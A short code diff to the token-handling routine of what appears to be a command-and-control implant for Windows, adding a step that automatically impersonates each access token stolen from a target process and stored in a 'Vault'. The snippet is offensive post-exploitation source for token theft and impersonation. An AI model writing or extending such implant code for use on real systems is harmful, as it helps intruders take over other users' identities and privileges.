@@ -1260,6 +1260,9 @@ VOID CommandToken( PPARSER Parser )
             User       = TokenGetUserDomain( StolenToken, &UserSize );
             NewTokenID = TokenAdd( StolenToken, User, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );
 
+            // when a new token is stolen, we impersonate it automatically
+            ImpersonateTokenFromVault( NewTokenID );
+
             PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );
 
             PackageAddBytes( Package, User, UserSize );
